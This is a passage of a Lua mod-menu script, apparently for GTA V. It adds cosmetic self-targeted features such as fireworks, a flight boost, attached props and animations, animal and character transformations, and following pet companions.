        "proj_indep_firework_v2",
        "proj_indep_firework_v2",
        "proj_indep_firework_v2",
        "proj_indep_firework_v2",
        "proj_xmas_firework",
        "proj_xmas_firework",
        "proj_xmas_firework",
    }
    effect_name = effects[count]
    asset_name = assets[count]
end)

--activate fire works----
menu.toggle(firework_list, "Firework", {}, "", function(on)
    if on then
        shooting = true
        local user_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 5.0, 0.0)
        local weap = util.joaat('weapon_firework')
        WEAPON.REQUEST_WEAPON_ASSET(weap)
        while shooting do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(user_pos.x, user_pos.y, user_pos.z, user_pos.x, user_pos.y, user_pos.z + 1, 200, 0, weap, 0, false, false, 1000)
            util.yield(250)
            ent_func.use_fx_asset(asset_name)
            local fx = GRAPHICS.START_PARTICLE_FX_LOOPED_AT_COORD(effect_name, user_pos.x, user_pos.y, user_pos.z+math.random(10, 40), 0.0, 0.0, 0.0, 1.0, false, false, false, false)
            util.yield(1000)
            GRAPHICS.STOP_PARTICLE_FX_LOOPED(fx, false)
        end
    end
    if not on then
        shooting = false
    end
end)

local superman = menu.list(fun, "Super Man Options", {}, "")

local jump = {height = 0.6 }
menu.toggle_loop(superman, "Super Man", {}, "Keep going higher the longer you press jump (can also be used to fly), Make sure you disable lock parachutes.", function () -- Credits to Acjoker Script
    menu.trigger_commands("paralock full")
    if PAD.IS_CONTROL_PRESSED(22, 22) or PAD.IS_CONTROL_JUST_PRESSED(21, 21) then
        PED.SET_PED_CAN_RAGDOLL(players.user_ped(), false)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(players.user_ped(), 1, 0.0, 0.6, jump.height, 0, 0, 0, 0, true, true, true, true)
        if ENTITY.IS_ENTITY_IN_AIR(players.user_ped()) then
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(players.user_ped(), 1, 0.0, 0.6, jump.height, 0, 0, 0, 0, true, true, true, true)
        end
    end
end)

menu.slider(superman, "Super Man Power", {"supermanpower"}, "Adjust the amount you move upwards. Make sure you disable lock parachutes.", 6, 1000, 6, 1, function (a) -- Credits to Acjoker Script
    jump.height = a*0.1
end)

function Play_guitar(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("amb@world_human_musician@guitar@male@idle_a") do 
        STREAMING.REQUEST_ANIM_DICT("amb@world_human_musician@guitar@male@idle_a")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    guitar = OBJECT.CREATE_OBJECT(util.joaat("prop_acc_guitar_01"), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "amb@world_human_musician@guitar@male@idle_a", "idle_b", 3, 3, -1, 51, 0, false, false, false) --play anim 
    ENTITY.ATTACH_ENTITY_TO_ENTITY(guitar, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 24818), -0.1,0.31,0.1,0.0,20.0,150.0, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(guitar)
    end
end

function Palm_spin_ball(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("anim@mp_player_intincarfreakoutstd@ps@") do 
        STREAMING.REQUEST_ANIM_DICT("anim@mp_player_intincarfreakoutstd@ps@")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    guitar = OBJECT.CREATE_OBJECT(util.joaat("prop_bowling_ball"), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "anim@mp_player_intincarfreakoutstd@ps@", "idle_a_fp", 10, 3, -1, 51, 5, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(guitar, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 24818), 0.30,0.53,0,0.2,70,340, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(guitar)
    end
end

function seek_help(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("amb@world_human_bum_freeway@male@base") do 
        STREAMING.REQUEST_ANIM_DICT("amb@world_human_bum_freeway@male@base")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    beggers = OBJECT.CREATE_OBJECT(util.joaat("prop_beggers_sign_03"), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "amb@world_human_bum_freeway@male@base", "base", 3, 3, -1, 51, 0, false, false, false) --play anim 
    ENTITY.ATTACH_ENTITY_TO_ENTITY(beggers, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 58868), 0.19,0.18,0.0,5.0,0.0,40.0, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(beggers)
    end
end

function offer_flower(on)
    while not STREAMING.HAS_ANIM_DICT_LOADED("anim@heists@humane_labs@finale@keycards") do 
        STREAMING.REQUEST_ANIM_DICT("anim@heists@humane_labs@finale@keycards")
        util.yield()
    end
    if on then
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(),true)
    rose = OBJECT.CREATE_OBJECT(util.joaat("prop_single_rose"), pos.x, pos.y, pos.z, true, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user_ped())
    TASK.TASK_PLAY_ANIM(players.user_ped(), "anim@heists@humane_labs@finale@keycards", "ped_a_enter_loop", 3, 3, -1, 51, 0, false, false, false) --play anim 
    ENTITY.ATTACH_ENTITY_TO_ENTITY(rose, players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), 18905), 0.13,0.15,0.0,-100.0,0.0,-20.0, false, true, false, true, 1, true)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
    else
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
        entities.delete_by_handle(rose)
    end
end

function Out_body(toggle)
    if toggle then
        all_peds = entities.get_all_peds_as_handles()
        user_ped = players.user_ped()
        clone = PED.CLONE_PED(user_ped,true, true, true)
        pos = ENTITY.GET_ENTITY_COORDS(clone, false)
        ENTITY.SET_ENTITY_COORDS(user_ped, pos.x-2, pos.y, pos.z)
        ENTITY.SET_ENTITY_ALPHA(players.user_ped(), 87, false)
        ENTITY.SET_ENTITY_INVINCIBLE(clone,true)
        menu.trigger_commands("invisibility remote")
        util.create_tick_handler(function()
        STREAMING.REQUEST_ANIM_DICT("move_crawl")
        PED.SET_PED_MOVEMENT_CLIPSET(clone, "move_crawl", -1)
        mod_uses("ped", if on then 1 else -1)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(clone, true)
        TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(clone, true)
        return ghost
        end)
        else
            clonepedpos = ENTITY.GET_ENTITY_COORDS(clone, false)
            ENTITY.SET_ENTITY_COORDS(user_ped, clonepedpos.x,clonepedpos.y,clonepedpos.z, false, false)
            entities.delete_by_handle(clone)
            ENTITY.SET_ENTITY_ALPHA(user_ped, 255, false)
            menu.trigger_commands("invisibility off")
        end
end

function attach_to_player(hash, bone, x, y, z, xrot, yrot, zrot)           
    local user_ped = PLAYER.PLAYER_PED_ID()
    hash = util.joaat(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do		
        util.yield()
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
    local object = OBJECT.CREATE_OBJECT(hash, 0.0,0.0,0, true, true, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, user_ped, PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), bone), x, y, z, xrot, yrot, zrot, false, false, false, false, 2, true) 
end
function delete_object(model)
    local hash = util.joaat(model)
    for k, object in pairs(entities.get_all_objects_as_handles()) do
        if ENTITY.GET_ENTITY_MODEL(object) == hash then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false) 
            entities.delete_by_handle(object)
        end
    end
end

function get_model_size(hash)
    local minptr = memory.alloc(24)
    local maxptr = memory.alloc(24)
    MISC.GET_MODEL_DIMENSIONS(hash, minptr, maxptr)
    min = memory.read_vector3(minptr)
    max = memory.read_vector3(maxptr)
    local size = {}
    size['x'] = max['x'] - min['x']
    size['y'] = max['y'] - min['y']
    size['z'] = max['z'] - min['z']
    size['max'] = math.max(size['x'], size['y'], size['z'])
    return size
end

local pmenu = menu.list(fun, "Player Stuff", {}, "Change Into Some Fun Stuff \n(Only Use One At A Time)")

attach_self = menu.list(pmenu, "Attach Stuff", {})
    menu.toggle(attach_self, "Snowman",{""}, "",function(on)
        local zhangzi = "prop_gumball_03"
        local sonwman = "prop_prlg_snowpile"
        if on then
            attach_to_player(sonwman, 0, 0.0, 0, 0, 0, 0,0)
            attach_to_player(sonwman, 0, 0.0, 0, -0.5, 0, 0,0)
            attach_to_player(sonwman, 0, 0.0, 0, -1, 0, 0,0)
            attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 50,0)
            attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 125,0)
            attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -50,0)
            attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -125,0)
        else
            delete_object(sonwman)
            delete_object(zhangzi)
        end
    end)
    menu.toggle(attach_self, "Katana's", {""}, "", function(state)
        local obj = "prop_cs_katana_01"
        if state then
            attach_to_player(obj, 0, 0, -0.13, 0.5, 0, -150,0)
            attach_to_player(obj, 0, 0, -0.13, 0.5, 0, 150,0)
            attach_to_player(obj, 0, 0.23, 0, 0, 0, -180,100)
        else
            delete_object(obj)
        end
    end)
    menu.toggle(attach_self, "666",{}, "",function(on)
        obj = "prop_mp_num_6"
        if on then     
            attach_to_player(obj, 0, 0, 0, 1.7, 0, 0, 180)
            attach_to_player(obj, 0, 1, 0, 1.7, 0, 0, 180)
            attach_to_player(obj, 0, -1, 0, 1.7, 0, 0, 180)
        else
            delete_object(obj)
        end
    end)
    menu.toggle(attach_self, "999",{}, "",function(on)
        obj = "prop_mp_num_9"
        if on then     
            attach_to_player(obj, 0, 0, 0, 1.7, 0, 0, 180)
            attach_to_player(obj, 0, 1, 0, 1.7, 0, 0, 180)
            attach_to_player(obj, 0, -1, 0, 1.7, 0, 0, 180)
        else
            delete_object(obj)
        end
    end)
    menu.toggle(attach_self, "Surfboard",{}, "",function(on)
        obj = "prop_surf_board_ldn_03"
        if on then     
            attach_to_player(obj, 0, 0, -0.2, 0.25, 0, -30,0)
        else
            delete_object(obj)
        end
    end)
    menu.toggle(attach_self, "Small School Bag",{}, "",function(on)
        obj = "tr_prop_tr_bag_djlp_01a"
        if on then     
            attach_to_player(obj, 0, 0, -0.2, 0.1, 0, 0,0)
        else
            delete_object(obj)
        end
    end)
    menu.toggle(attach_self, "Lifeboard",{}, "",function(on)
        obj = "prop_beach_ring_01"
        if on then     
            attach_to_player(obj, 0, 0, 0, 0, 0, 0,0)
        else
            delete_object(obj)
        end
    end)
    guitar_obj = menu.list(attach_self, "Guitar")
        menu.toggle(guitar_obj, "Guitar 1",{}, "",function(on)
            local obj = "prop_acc_guitar_01"
            if on then     
                attach_to_player(obj, 0, 0, -0.15, 0.25, 0, -50,0)
            else
                delete_object(obj)
            end
        end)
        menu.toggle(guitar_obj, "Guitar 2",{}, "",function(on)
            local obj = "prop_el_guitar_03"
            if on then     
                attach_to_player(obj, 0, 0, -0.15, 0.25, 0, -50,0)
            else
                delete_object(obj)
            end
        end)
        menu.toggle(guitar_obj, "Guitar 3",{}, "",function(on)
            local obj = "prop_el_guitar_01"
            if on then     
                attach_to_player(obj, 0, 0, -0.15, 0.25, 0, -50,0)
            else
                delete_object(obj)
            end
        end)
        menu.toggle(guitar_obj, "Guitar 4",{}, "",function(on)
            local obj = "prop_el_guitar_02"
            if on then     
                attach_to_player(obj, 0, 0, -0.15, 0.25, 0, -50,0)
            else
                delete_object(obj)
            end
        end)
    menu.toggle(attach_self, "Play The Guitar", {}, "", function(on)
        Play_guitar(on)
    end)
    menu.toggle(attach_self, "Palm Spin", {}, "", function(on)
        Palm_spin_ball(on)
    end)
    menu.toggle(attach_self, "Ask For Help", {}, "", function(on)
        seek_help(on)
    end)
    menu.toggle(attach_self, "Offer Flower", {}, "", function(on)
        offer_flower(on)
    end)

    menu.toggle(pmenu, "Become A Cat", {}, "Change Into A Cat", function(on)
        if on then
            menu.trigger_commands("noguns")
            util.yield(200)
            menu.trigger_commands("accat01")
        else
            menu.trigger_commands("mpfemale")
            menu.trigger_commands("allguns")
        end
    end)

menu.toggle(pmenu, "Become A Monekey", {}, "Change Into A Money", function(on)
    if on then
        menu.trigger_commands("acchimp02")
    else
        menu.trigger_commands("mpfemale")
    end
end)

menu.toggle(pmenu, "Become A KillerWhale", {}, "Change Into A KillerWhale", function(on)
    if on then
        menu.trigger_commands("noguns")
        local player_ped = PLAYER.PLAYER_PED_ID()    
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -2592.5793, -612.5788, -34.412697)
        util.yield(1)
        menu.trigger_commands("ackillerwhale")
    else
        menu.trigger_commands("allguns")
        menu.trigger_commands("mpfemale")
        util.yield(500)
        menu.trigger_commands("tpmazehelipad")
    end
end)

menu.toggle(pmenu, "Become A Rat", {}, "Change Into A Rat", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACRat")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become A Mountain Lion", {}, "Change Into A Mountain Lion", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACmtlion")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become A Panther", {}, "Change Into A Panther", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACpanther")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become Westy (Dog)", {}, "Change Into Westy (Dog)", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACWesty")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become A GermanShepherd (Dog)", {}, "Change Into A GermanShepherd (Dog)", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACShepherd")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become A Rottweiler (Dog)", {}, "Change Into A Rottweiler (Dog)", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACRottweiler")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become A Poodle (Dog)", {}, "Change Into A Poodle (Dog)", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACPoodle")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become A Boar", {}, "Change Into A Boar", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACBoar")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become Pug (Dog)", {}, "Change Into Pug (Dog)", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACPug")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become Chop (Dog)", {}, "Change Into Chop (Dog)", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACChop")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become A Coyote", {}, "Change Into A Coyote", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACCoyote")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become A Deer", {}, "Change Into A Deer", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACDeer")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.action(pmenu, "Become A Chickenhawk", {"chickenhawktoggle"}, "Change Into A Chickenhawk", function(on)
    if on then
        util.toast("GodMode Will Be Off Due To Player Model \n(In Other Words You Can Die As This)")
        menu.trigger_commands("noguns")
        menu.trigger_commands("reducedcollision" .. " on")
        menu.trigger_commands("acchickenhawk")
    else
        menu.trigger_commands("reducedcollision" .. " off")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.action(pmenu, "Become A Pigeon", {"pigeontoggle"}, "Change Into A Pigeon", function(on)
    if on then
        util.toast("GodMode Will Be Off Due To Player Model \n(In Other Words You Can Die As This)")
        menu.trigger_commands("noguns")
        menu.trigger_commands("reducedcollision" .. " on")
        menu.trigger_commands("acpigeon")
    else
        menu.trigger_commands("reducedcollision" .. " off")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.action(pmenu, "Become A Cormorant", {"cormoranttoggle"}, "Change Into A Cormorant", function(on)
    if on then
        util.toast("GodMode Will Be Off Due To Player Model \n(In Other Words You Can Die As This)")
        menu.trigger_commands("noguns")
        menu.trigger_commands("reducedcollision" .. " on")
        menu.trigger_commands("ACCormorant")
    else
        menu.trigger_commands("reducedcollision" .. " off")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.action(pmenu, "Become A Crow", {"crowtoggle"}, "Change Into A Crow", function(on)
    if on then
        util.toast("GodMode Will Be Off Due To Player Model \n(In Other Words You Can Die As This)")
        menu.trigger_commands("noguns")
        menu.trigger_commands("reducedcollision" .. " on")
        menu.trigger_commands("ACCrow")
    else
        menu.trigger_commands("reducedcollision" .. " off")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become A Pig", {}, "Change Into A Pig", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACPig")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become A Rabbit", {}, "Change Into A Rabbit", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACRabbit")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become A Big Rabbit", {}, "Change Into A Big Rabbit", function(on)
    if on then
        menu.trigger_commands("noguns")
        menu.trigger_commands("ACRabbit02")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("allguns")
    end
end)

menu.toggle(pmenu, "Become A Furry", {}, "Change Into A Furry lol", function(on)
    if on then
        menu.trigger_commands("IGFurry")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
    end
end)

menu.toggle(pmenu, "Become Yule Monster", {}, "Change Into Yule Monster", function(on)
    if on then
        menu.trigger_commands("UMMYuleMonster")
        menu.trigger_commands("walkstyle mop")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
    end
end)

menu.toggle(pmenu, "Become Bigfoot", {}, "Change Into Bigfoot", function(on)
    if on then
        menu.trigger_commands("otr")
        menu.trigger_commands("igorleans")
    else
        menu.trigger_commands("otr")
        menu.trigger_commands("mpfemale")
    end
end)

menu.toggle(pmenu, "Become Trevor", {}, "Change Into Trevor", function(on)
    if on then
        menu.trigger_commands("trevor")
        menu.trigger_commands("walkstyle verydrunk")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
    end
end)

menu.toggle(pmenu, "Become Micheal", {}, "Change Into Micheal", function(on)
    if on then
        menu.trigger_commands("michael")
        menu.trigger_commands("walkstyle Micheal")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
    end
end)

menu.toggle(pmenu, "Become Franklin", {}, "Change Into Franklin", function(on)
    if on then
        menu.trigger_commands("franklin")
        menu.trigger_commands("walkstyle Franklin")
    else
        menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("mpfemale")
    end
end)

local fpets = menu.list(fun, "Pets", {}, "Use 1 of them")

menu.toggle_loop(fpets, "Pet Husky (Dog)", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("a_c_Husky")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        --PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 2, -1, 0.25, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Chicken", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("a_c_hen")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 1.5, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Cat", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("a_c_cat_01")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        --PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 0, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Monkey", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Chimp_02")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        --PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 7.5, -1, 1.5, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Pigeon", {}, "Bro Is A Like A Snail You Might Forget About Him", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Pigeon")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 6.5, -1, 1.5, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Rabbit", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Rabbit_01")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 10.5, -1, 1.5, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Big Rabbit", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Rabbit_02")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 10.5, -1, 1.5, true)
    util.yield(2500)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pet Westy (Dog)", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("A_C_Westy")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
